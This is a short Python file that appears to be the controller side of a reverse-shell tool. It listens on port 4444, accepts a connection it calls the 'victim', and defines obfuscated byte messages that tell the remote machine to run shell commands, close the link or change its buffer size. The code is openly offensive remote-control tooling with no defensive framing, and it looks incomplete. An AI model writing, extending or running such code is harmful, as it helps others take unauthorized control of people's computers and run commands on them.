import queue as q
import socket as s
import sys
import threading
import time as t

victimQueue = q.Queue()

closeConnectionMessage = b'\x10\x10\x10\x10\c\l\c\o\x11\x11\x11\x11'
shellCmdMessage = b'\x10\x10\x10\x10\x65\x78\x73\x68\x63\x6d\x11\x11\x11\x11'
nextByteBufferSize = b'\x6e\x62\x62\x73'


def startListener(lhost: str, lport: int, **kwargs):
    server = s.socket(s.AF_INET, s.SOCK_STREAM)
    server.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
    server.bind((lhost, lport))
    server.listen(0)
    victim, victim_addr = server.accept()
    victimQueue.put((victim, victim_addr))


def closeConnection(victim: s.SOCK_STREAM):
    victim.send(closeConnectionMessage)


def execShellCmd(victim: s.SOCK_STREAM, command: str):
    victim.send(shellCmdMessage + command.encode())


def updateBufferSize(victim: s.SOCK_STREAM, size: int):
    victim.send(nextByteBufferSize + size.to_bytes((size.bit_length() + 7) // 8, 'big'))

startListener("localhost", 4444)

v, va = victimQueue.get_nowait()
updateBufferSize(v, 10)
updateBufferSize(v, 400)
